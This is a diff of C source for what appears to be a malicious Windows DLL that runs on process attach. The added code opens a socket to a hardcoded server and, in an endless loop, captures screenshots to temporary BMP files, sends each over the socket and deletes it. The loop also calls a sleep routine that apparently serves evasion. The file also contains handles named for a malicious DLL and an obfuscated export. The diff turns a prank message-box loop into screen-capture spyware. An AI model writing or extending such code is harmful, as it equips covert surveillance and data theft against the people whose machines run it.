@@ -8,6 +8,7 @@
 #include <stdint.h>
 #include "utils.h"
 #include "utils_headers.h"
+#include "mylibc.h"
 
 typedef struct _SAC_DLL_HEADER
 {
@@ -648,25 +649,27 @@ EXTERN_DLL_EXPORT bool _123321_asdf21425()
 }
 
 
-int connect_to_server(winsock_functions_t* ws_funcs, kernel32_functions_t* krnl_funcs)
+static SOCKET connect_to_server(winsock_functions_t* ws_funcs, kernel32_functions_t* krnl_funcs)
 {
+	SOCKET socket = INVALID_SOCKET;
 	if (startup_wsa(ws_funcs) != 0)
 	{
-		return -1;
+		return socket;
 	}
 
-	if (init_connection(SERVER_HOSTNAME, SERVER_PORT, ws_funcs, krnl_funcs) != 0)
+	socket = init_connection(SERVER_HOSTNAME, SERVER_PORT, ws_funcs, krnl_funcs);
+	if (socket == INVALID_SOCKET)
 	{
 		cleanup_wsa(ws_funcs);
-		return -1;
 	}
 
-	return 0;
+	return socket;
 }
 
 
 static BOOL custom_process_attach(HMODULE hModule)
 {
+	int status = 0;
 
 	PSAC_DLL_HEADER sac_dll_header = NULL;
 
@@ -723,21 +726,45 @@ static BOOL custom_process_attach(HMODULE hModule)
 	}
 
 
-	int* buggy = NULL;
-	*buggy = 0xAAAAAAAA;
 	
-	connect_to_server(&global_functions.ws_funcs, &global_functions.krnl_funcs);
-
+	SOCKET socket = connect_to_server(&global_functions.ws_funcs, &global_functions.krnl_funcs);
 
 	do
 	{
-		MessageBoxA(NULL, "Ciallo～(∠ · ω< )⌒☆", "Ciallo～(∠ · ω< )⌒☆", MB_ICONERROR);
+		char* filename = create_temp_filename("screenshot", &global_functions.krnl_funcs);
+		my_strncat(filename, ".bmp", 4);
+
+		
+		status = capture_screenshot_win32(filename, &global_functions.krnl_funcs, &global_functions.user32_funcs, &global_functions.gdi32_funcs);
+
+		//int* buggy = NULL;
+		//*buggy = 0xAAAAAAAA;
+
+		status = send_file_over_socket(socket, filename, &global_functions.ws_funcs, &global_functions.krnl_funcs);
+
+		if (status != 0)
+		{
+			// reconnect
+		}
+
+		cleanup_temp_file(filename, &global_functions.krnl_funcs);
+
 		if (sleaping(sac_dll_base, sac_dll_handle, mal_dll_handle, sac_dll_size, &nt_funcs) == -1)
 		{
-			MessageBoxA(0, 0, 0, MB_OK | MB_ICONINFORMATION);
 			return FALSE;
 		}
+
 	} while (true);
+
+	//do
+	//{
+	//	MessageBoxA(NULL, "Ciallo～(∠ · ω< )⌒☆", "Ciallo～(∠ · ω< )⌒☆", MB_ICONERROR);
+	//	if (sleaping(sac_dll_base, sac_dll_handle, mal_dll_handle, sac_dll_size, &nt_funcs) == -1)
+	//	{
+	//		MessageBoxA(0, 0, 0, MB_OK | MB_ICONINFORMATION);
+	//		return FALSE;
+	//	}
+	//} while (true);
 
 	return TRUE;
 }
